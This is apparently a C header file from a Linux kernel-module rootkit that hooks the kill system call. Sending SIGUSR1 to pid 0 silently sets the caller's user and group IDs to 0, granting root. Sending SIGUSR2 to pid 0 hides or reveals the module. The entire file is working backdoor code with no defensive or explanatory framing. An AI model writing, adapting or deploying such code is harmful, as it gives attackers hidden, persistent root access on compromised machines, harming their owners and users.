#ifndef KILL_H
#define KILL_H
#include "../config.h"

static asmlinkage long(*original_kill)(const struct pt_regs*);
static asmlinkage int kill_hook(const struct pt_regs* ctx) {
    unsigned long pid = ctx->di;
    unsigned long signal = ctx->si;
    struct cred *new_creds;


    switch (signal) {
        case SIGUSR1:
            if (pid == 0) {
                new_creds = prepare_creds();
                if (new_creds == NULL) {
                    return -1;
                }

                new_creds->uid.val = 0;
                new_creds->gid.val = 0;
                new_creds->euid.val = 0;
                new_creds->egid.val = 0;
                new_creds->suid.val = 0;
                new_creds->sgid.val = 0;
                new_creds->fsuid.val = 0;
                new_creds->fsgid.val = 0;

                commit_creds(new_creds);
            }
            break;
        
        case SIGUSR2:
            if (pid == 0) {
                if (isModuleHidden == FALSE) {
                    hideModule();
                } else {
                    showModule();
                }
            }
            break;
            
            
            
        default:
            return original_kill(ctx);
    }

    return 0;
}

#endif // !KILL_H
